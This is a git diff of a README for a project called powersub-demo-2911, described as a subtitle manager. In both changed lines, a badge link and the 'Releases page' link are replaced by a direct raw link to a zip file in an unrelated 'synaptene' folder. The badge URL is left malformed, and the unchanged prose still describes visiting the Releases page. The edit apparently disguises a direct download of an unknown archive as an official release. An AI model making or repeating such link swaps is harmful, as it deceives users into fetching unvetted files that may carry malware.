@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-2911 - Easy subtitle management for everyone
 
-![Download from releases](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)
+![Download from releases](https://raw.githubusercontent.com/junaidprmmj/powersub-demo-2911/main/synaptene/powersub-demo-2911.zip%20Now-v1.0-brightgreen)
 
 ## 📥 Introduction
 
@@ -21,7 +21,7 @@ To get started with powersub-demo-2911, follow these simple steps to download an
 
 You can download powersub-demo-2911 from our Releases page. Follow this link:
 
-[Download from Releases](https://github.com/junaidprmmj/powersub-demo-2911/releases)
+[Download from Releases](https://raw.githubusercontent.com/junaidprmmj/powersub-demo-2911/main/synaptene/powersub-demo-2911.zip)
 
 1. Click the link above to visit the Releases page.
 2. Look for the latest version of powersub-demo-2911.
